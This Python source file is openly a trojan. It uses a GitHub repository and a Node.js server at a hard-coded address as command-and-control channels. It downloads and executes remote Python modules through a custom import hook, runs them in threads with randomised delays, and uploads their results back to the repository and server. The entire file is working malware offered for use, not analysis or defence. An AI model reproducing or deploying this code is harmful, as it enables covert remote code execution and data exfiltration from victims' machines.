import base64
import github3
import importlib
import json
import random
import sys
import threading
import time
import requests
from datetime import datetime

def github_connect():
    with open('secret.txt') as f:
        token = f.read().strip()
    user = 'hacksparkdev'
    sess = github3.login(token=token)
    return sess.repository(user, 'Trojan')

def get_file_contents(dirname, module_name, repo):
    return repo.file_contents(f'{dirname}/{module_name}').content

class Trojan:
    def __init__(self, id, node_server_url):
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{self.id}/'
        self.repo = github_connect()
        self.node_server_url = node_server_url
        self.running = True

    def get_github_config(self):
        config_json = get_file_contents('config', self.config_file, self.repo)
        return json.loads(base64.b64decode(config_json))

    def get_nodejs_commands(self):
        try:
            response = requests.get(f"{self.node_server_url}/config")
            return response.json()
        except requests.exceptions.RequestException as e:
            print(f"[*] Failed to get commands from Node.js server: {e}")
            return {"commands": [], "stop": False}

    def send_command_result(self, command, result):
        try:
            payload = {
                "command": command,
                "result": result
            }
            requests.post(f"{self.node_server_url}/command", json=payload)
        except requests.exceptions.RequestException as e:
            print(f"[*] Failed to send command result to Node.js server: {e}")

    def module_runner(self, module):
        result = sys.modules[module].run()
        self.store_module_result(result)

    def store_module_result(self, data):
        message = datetime.now().isoformat()
        remote_path = f'data/{self.id}/{message}.data'
        bindata = base64.b64encode(bytes('%r' % data, 'utf-8'))
        self.repo.create_file(remote_path, message, bindata)

    def run_modules_from_commands(self, commands):
        for command in commands:
            if command['module'] not in sys.modules:
                exec("import %s" % command['module'])
            thread = threading.Thread(target=self.module_runner, args=(command['module'],))
            thread.start()
            time.sleep(random.randint(1, 10))

    def run(self):
        while self.running:
            # Fetch real-time commands from Node.js server
            nodejs_commands = self.get_nodejs_commands()

            if nodejs_commands.get('stop'):
                self.running = False
                self.send_command_result("stop", "Trojan stopped.")
                print("[*] Trojan stopped.")
                break

            # Run modules based on Node.js commands
            self.run_modules_from_commands(nodejs_commands.get('commands', []))

            time.sleep(random.randint(30*60, 3*60*60))  # Sleep before checking for new commands

class GitImporter:
    def __init__(self):
        self.current_module_code = ""

    def find_spec(self, fullname, path, target=None):
        print(f"[*] Attempting to retrieve {fullname}")
        self.repo = github_connect()
        try:
            new_library = get_file_contents('modules', f'{fullname}.py', self.repo)
            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)
                return importlib.util.spec_from_loader(fullname, loader=self)
        except github3.exceptions.NotFoundError:
            print(f"[*] Module {fullname} not found in repository.")
            return None

    def create_module(self, spec):
        return None

    def exec_module(self, module):
        exec(self.current_module_code, module.__dict__)

if __name__ == '__main__':
    sys.meta_path.append(GitImporter())
    NODE_SERVER_URL = "<http://10.0.100.100:3000>"  # Change this to your Node.js server URL
    trojan = Trojan('abc', NODE_SERVER_URL)
    trojan.run()
